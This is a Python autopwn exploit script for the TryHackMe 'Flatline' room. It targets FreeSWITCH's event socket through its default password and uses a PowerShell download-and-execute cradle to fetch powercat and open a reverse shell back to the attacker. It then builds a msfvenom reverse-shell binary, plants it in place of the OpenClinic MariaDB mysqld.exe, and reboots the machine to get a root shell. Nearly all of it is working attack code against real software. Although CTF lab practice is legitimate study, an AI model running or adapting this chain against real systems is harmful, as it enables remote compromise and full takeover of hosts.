#!/usr/bin/env python3

# AutoPwn script For the room Flatline on try hack me
## FREESWICH EXPLOIT based on a CTF box

import os
import sys
from pwn import *
from urllib import request

if len(sys.argv) != 4:
    print("Usage:   ./exploit.py RHOST LHOST LPORT")
    print("Example: ./exploit.py 192.168.0.1 192.168.0.2 1234")
    sys.exit(1)

# download powercat and open a python server on port 8000 in the directory where powecat is.
#powercat = "https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1"
#request.urlretrieve(powercat, "powercat.ps1")

RHOST = sys.argv[1] # target machine io
RPORT = 8021 #target port

LHOST = sys.argv[2] # attacking machine ip
LPORT = sys.argv[3] # port to get initial connection
PythonPORT = 8000
rootPort = 12345

# Generate shellcode
shellcode = f"msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={rootPort} -f exe > mysqld.exe"
print("[*] Generating Shellcode")
result = os.popen(shellcode).read()

# RCE Initial access
conn = remote(f"{RHOST}", RPORT)
conn.send(b"auth ClueCon\n\n")
cmd = f"api system powershell -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://{LHOST}:{PythonPORT}/powercat.ps1');powercat -c {LHOST} -p {LPORT} -e cmd\"\n\n"
conn.send(bytes(cmd, 'utf8'))

# compromise and privesc
netcat = listen(LPORT)
svr = netcat.wait_for_connection()
cmd = f"curl http://{LHOST}:{PythonPORT}/mysqld.exe -o \"C:\projects\openclinic\mariadb\\bin\mysqld_evil.exe\""
svr.sendline(bytes(cmd, "utf8"))
svr.sendline(b"ren \"C:\projects\openclinic\mariadb\\bin\mysqld.exe\" \"mysqld.bak\"")
svr.sendline(b"ren \"C:\projects\openclinic\mariadb\\bin\mysqld_evil.exe\" \"mysqld.exe\"")
svr.sendline(b"shutdown -r")

# root
netcat2 = listen(rootPort)
svr2 = netcat2.wait_for_connection()
svr2.interactive()

# kmbh1WaL5ibpZHbhNkL2YzQ2YkN3cDew4iZs92duAkLy9Ga0VXY
